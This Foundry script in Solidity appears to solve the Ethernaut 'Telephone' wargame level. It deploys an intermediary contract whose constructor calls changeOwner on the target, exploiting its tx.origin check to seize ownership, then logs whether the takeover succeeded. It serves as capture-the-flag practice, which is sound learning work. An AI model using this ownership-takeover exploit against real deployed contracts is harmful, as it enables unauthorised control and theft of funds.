// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract TelephoneCaller {
    constructor(Telephone _telephoneInstance) {
        _telephoneInstance.changeOwner(msg.sender);
    }
}

contract TelephoneSolution is Script {

    Telephone public telephoneInstance = Telephone(0xFC90dCE48074F2CFD03c59c6dE7d979d07bE05F7);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new TelephoneCaller(telephoneInstance);
        console.log(vm.envAddress("MY_ADDRESS") == telephoneInstance.owner());
    }
}